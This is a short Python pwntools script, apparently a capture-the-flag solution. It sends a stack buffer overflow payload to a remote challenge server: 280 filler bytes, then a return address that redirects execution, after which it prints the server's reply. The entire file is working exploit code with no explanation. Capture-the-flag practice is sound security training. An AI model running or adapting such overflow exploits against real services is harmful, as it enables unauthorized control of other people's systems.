from pwn import *


payload = 'A'*280+p64(0x400727)
p = remote('chals20.cybercastors.com',14424)
print p.recvuntil(': ')
p.sendline(payload)
print p.recvall()

